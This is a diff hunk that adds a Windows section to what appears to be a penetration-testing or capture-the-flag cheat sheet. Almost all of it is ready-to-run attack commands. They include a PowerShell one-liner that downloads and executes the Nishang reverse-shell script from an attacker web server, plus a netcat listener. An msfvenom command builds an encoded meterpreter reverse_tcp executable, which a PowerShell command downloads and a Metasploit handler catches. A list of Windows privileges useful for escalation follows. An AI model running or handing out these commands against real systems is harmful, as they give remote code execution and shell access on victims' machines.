@@ -371,6 +371,41 @@ run
 
 ```
 
+## windows
+```
+https://github.com/samratashok/nishang
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+python3 -m http.server
+nc -lnvp 1234
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://ip:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ip -Port 1234
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.31.164 LPORT=9000 -f exe -o re.exe
+
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.31.164:8000/re.exe','re.exe')"
+
+msfconsole
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.31.164 
+set LPORT 9000
+run
+
+Start-Process "re.exe"
+
+whoami /priv
+
+juicy priv
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+```
 
 ## TIPS
 ```
